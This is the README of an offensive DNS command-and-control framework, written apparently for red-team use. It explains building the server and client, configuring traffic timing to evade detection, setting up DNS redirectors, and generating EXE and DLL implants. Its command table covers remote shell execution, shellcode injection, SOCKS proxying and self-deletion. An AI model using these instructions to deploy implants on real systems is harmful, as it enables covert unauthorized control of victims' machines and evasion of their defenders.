
# Wareed DNS C2
![enter image description here](https://i.ibb.co/KxqTJjn/Picture1-removebg-preview-2.png)

WAREED is a Command and Control (C2) that utilizes the DNS protocol for secure communications between the server and the target. Designed to minimize communication and limit data exchange, it is intended to be a first-stage C2 to persist in machines that don't have access to the internet via HTTP/HTTPS, but where DNS is allowed.

developed by :   [@Faisal_P27](https://twitter.com/Faisal_P27) 

# How it works
![enter image description here](https://i.ibb.co/GstYxfN/Capture12.png)


## Why Wareed

While many Command and Control (C2) frameworks support DNS as a transport protocol, they are predominantly designed for HTTP/HTTPS. Transitioning these frameworks to DNS often results in slower, less stable operations. Facing numerous challenges with these frameworks' instability for DNS transactions, I was compelled to create a solution tailored specifically to DNS. The outcome is Wareed—a DNS-only C2 framework. This specialized focus results in a more stable and efficient operation, making Wareed faster and more reliable compared to traditional C2 frameworks that are not primarily designed for DNS. This makes Wareed an ideal choice for environments where DNS traffic is allowed but HTTP/HTTPS is restricted.

## About

It has been developed using three programming languages: 

 1. Hams Agent in C
 2. Wareed Team server in Golang
 3. Ather Client GUI in C++
 
 Names explanation:
 
**Hams (همس)** means "whisper" in Arabic

**Wareed (وريد)** means "vein" in Arabic

**Ather (أثر)** means "trace" in Arabic

## **Demo**

[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/4wim6WOi1WU/0.jpg)](https://www.youtube.com/watch?v=4wim6WOi1WU)

## **Prerequisites**
1.  Valid controlled domain name
2.  Kali Linux 2023+ or Ubuntu 23+
3.  One redirector (Ubuntu) to handle DNS connections (optional)

## Installation

**Step 1**: Clone the Wareed repository:

    git clone https://github.com/Faisal-P27/WAREED-DNS-C2.git

 **Step 2**: Run the setup script:

    cd WAREED-DNS-C2
    chmod +x Run.sh
    sudo ./Run.sh setup
  
If the compilation process completes successfully, two executable files will be generated in the same directory:
-   **WareedServer**: This file serves as the executable for the team server
-   **Ather**: This file is the executable for the GUI client.

also it will checks the compilation status of the Agent. If successful, it confirms that the Agent is ready to be deployed and operational, which is critical for the functionality of the Wareed C2.

### Configuration


    {
	    "magic_value": "cdn",
	    "domains": ["2.example.net"],
	    "listener_port": "111",
	    "sleep": 5,
	    "jitter": 50,
	    "lookup_delay": 5,
	    "default_dns_server": "1.1.1.1"
    }

 

 - **magic_value**: A unique identifier used by the C2.
 - **domains**: An array of domain names used by the C2 for DNS communications.
 - **listener_port**: The port number on which the DNS Team server listens for incoming connections.
 - **sleep**: The base delay between task requests.
 - **jitter**: A percentage that adds randomness to the sleep intervals to disguise traffic patterns.
 - **lookup_delay**: The delay before performing a DNS lookup to pace DNS queries and avoid detection.
 - **default_dns_server (disabled)**: The DNS server specified for use by the Agent if local DNS dose not respond. 
 > **magic_value:** lenath must equal to **3**.




## DNS Infrastructure

**DNS Setup:**
To operate Wareed, it is essential to possess a valid domain name. After acquiring a domain, two DNS records need to be configured to point towards the Redirector:

1.  **A Record**: This should be set up to point to the IP address of the Redirector.
2.  **NS Record**: This needs to point to the A record you previously established.

![example](https://i.ibb.co/S6V59b2/Picture1222.png)

### infrastructure
**Redirector Setup:** 
redirector will handle incoming DNS traffic on port 53 and redirect it to the team server. To achieve this, execute the following `iptables` commands on the redirector machine (R1):
##### **Accept DNS Requests**:

    iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT

This command configures the firewall to accept incoming UDP packets on port 53, which is the standard port for DNS requests.
##### ****Redirect DNS Traffic****:

    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination [TeamServer IP]:[teamserver listener port]

Replace `[TeamServer IP]` with the actual IP address of your team server and `[teamserver listener port]` with the port number on which your team server is listening. This command directs all traffic arriving on port 53 to the specified IP address and port of the team server.


![enter image description here](https://i.ibb.co/FXnJHsF/Picture23.png)


# Run Wareed
### Wareed Team Server

To start the Wareed team server for the first time, you need to specify the configuration file along with the client password and the port on which the client will listen. Use the following command to run the Wareed team server:

    sudo ./WareedServer [Client Password] [Client Port Listener] [Path to configuration file]
-   **[Client Password]**: Replace this placeholder with the password that clients will use to authenticate with the server.
-   **[Client Port Listener]**: Replace this with the port number where the team server will listen for incoming connections from the client.
-   **[Path to configuration file]**: Provide the full path to the initial configuration file. On subsequent runs, this configuration will be loaded from the database, and no need to specify it again.

### Ather GUI Client
To launch the Ather GUI client, simply

    ./Ather

Upon running the command, a new window with a login page will appear.

![enter image description here](https://i.ibb.co/vvCKPF4/Wareed-Login.png)

**Login Details**: In the login page that appears:

-   **Username**: Enter the username .
-   **Password**: Enter the corresponding password as configured in the team server command line.
-   **Port**: Enter the port number on which the team server is listening for connections as configured in the team server command line.
-  **IPAddress**: Enter the team server address.

Wareed main window:
![enter image description here](https://i.ibb.co/k1WB4vt/wareed-main-window.png)

#### Generate New payload 

To generate a new payload with the Ather GUI Client, follow these steps:

1.  **Navigate to Payload Generation**:
    
    -   Open the GUI client.
    -   From the menu bar, navigate to `Payload` > `Generate` > `Windows`. Selecting this option will open a new window tailored for payload generation.

![enter image description here](https://i.ibb.co/p4yrtkp/wareed-generate-payload.png)

2.  **Selecting Payload Type**:
    Wareed allows the generation of two types of payloads:
        -   **EXE**: An executable file format, straightforward for deployment.
        -   **DLL**: A dynamic link library that can be used in a variety of ways.
        - 
#### DLL Payload Options:

1.  ****Export Function****: Creates a DLL with specific functions that trigger agent functionality upon execution. 
2.  ****Process Attachment****: Produces a DLL that, when attached to a process, immediately activates the payload. 

## Session
After generating a new payload, a new guest session is automatically registered with the team server. This registration process ensures that only this specific session can connect with the team server. It utilizes a unique identifier and a 'magic value' to authenticate and authorize the session. This mechanism ensures secure and controlled communication between the newly generated payload and the team server.
![enter image description here](https://i.ibb.co/GTdjMH3/Wareed-goust-session.png)
#### Execute payload
After executing the payload on a Windows machine, it will begin generating DNS queries to register with the team server. This registration process occurs within seconds and typically involves generating between 3 to 5 DNS queries.
![enter image description here](https://i.ibb.co/QPxQ2RX/wareed-session.png)

## Interact
To interact with a session, simply right-click on the desired session and select "Interact" from the context menu. This action will open a new tab featuring a terminal interface. In this terminal, you can execute commands
![enter image description here](https://i.ibb.co/4sNfcQj/Wareed-interact.png)

#### Commands 

| Command     | Description                               | Usage                                                     | Example                                                  |
|-------------|-------------------------------------------|-----------------------------------------------------------|----------------------------------------------------------|
| help        | Shows help message of specified command   | [command]                                                 | help shell                                               |
| sleep       | sets the delay to sleep with jitter       | [delay] [jitter]                                          | sleep 10 50                                              |
| shell       | executes cmd.exe commands and gets output | [commands]                                                | shell dir c:\windows\system32 (please don't do it)       |
| inject      | injects shellcode into a remote process   | [pid] [shellcode_path]                                    | inject 1234 /path/to/shellcode.bin                       |
| proxystart  | starts a SOCKS5 proxy                     | [callback_host] [agent_connect_port] [proxy_listener_port]| proxystart example.com 443 1080                          |
| proxystop   | stops a SOCKS5 proxy                      | [callback_host] [agent_connect_port] [proxy_listener_port]| proxystop example.com 443 1080                           |
| adddomain   | adds a new callback domain                | [domain_name]                                             | adddomain example.com                                    |
| deldomain   | deletes a callback domain                 | [domain_name]                                             | deldomain example.com                                    |
| listdomain  | lists all active callback domains         |                                                           | listdomain                                               |
| kill        | Terminate the current process.            | [yes]                                                     | kill yes                                                 |
| wipe        | Terminate and delete the current process. | [yes]                                                     | wipe yes                                                 |
| selfdel     | Delete the current process from the disk. | [yes]                                                     | selfdel yes                                              |
| tasklist    | Lists all queued tasks                    |                                                           | tasklist                                                 |
| taskdel     | Delete a specific task by ID              | [task id]                                                 | taskdel 123                                              |
| tasksclean  | Delete all tasks in the queue             | [yes]                                                     | tasksclean yes                                           |
| clear       | clear the terminal screen                 |                                                           | clear                                                    |


> **Note:** The `inject` command is straightforward but often detected by security controls. To enhance stealth, you should implement your own injection technique. Modify the injection code in `Agent/Source/Core/Tasks/Modules/Injection.c`. Here's a basic template for customizing the injection function: 

    int Inject(unsigned char *ShellCode, int size, int ProcessID) {
		// Add your injection technique here.
		// You will receive the shellcode in [unsigned char *ShellCode] and shellcode size in [nt size]
		// and the process ID in [int ProcessID].
     }
### Clean Database

To clean the database, simply execute the following command in your terminal:

    ./Run clean

## Further action
While I have no immediate plans to continue investing time in the Wareed project, it has been an incredible learning journey, and I thoroughly enjoyed it. I am excited to announce that I am planning to launch a new major project, **THAWD BAS**. For more information, please visit [Thawd.io](https://thawd.io/).

If you have development skills and are interested in contributing to Wareed, here are a couple of opportunities:

1.  **Develop a Stager Payload Using DNS**: There's an awesome project by [@C5pider](https://twitter.com/C5pider) that provides a shellcode template which is a great starting point. Check out [Stardust](https://github.com/Cracked5pider/Stardust) on GitHub.
3. **Add a COFF Loader and Integration**:  Integrating a COFF (Common Object File Format) loader into Wareed framework can significantly enhance its capabilities by enabling dynamic loading and execution of binary modules, thus increasing operational flexibility. For developers looking to implement this feature, resources like Sector7 offer valuable insights on COFF loader functionality, and the open-source project [CoffeeLdr](https://github.com/Cracked5pider/CoffeeLdr) by [@C5pider](https://twitter.com/C5pider) provides a practical implementation example.



## Special Thanks 
This work could not have been accomplished without the contribution of several outstanding open-source projects:

**[Havoc](https://github.com/HavocFramework/Havoc)** by -   [@C5pider](https://twitter.com/C5pider)

**[Boomerang](https://github.com/paranoidninja/Boomerang)** by -   [@NinjaParanoid](https://twitter.com/NinjaParanoid)

**[Socks5Server](https://github.com/earthquake/Socks5Server)**  by [earthquake](https://github.com/earthquake)

**[delete-self-poc](https://github.com/LloydLabs/delete-self-poc)** by -   [@LloydLabs](https://twitter.com/LloydLabs)


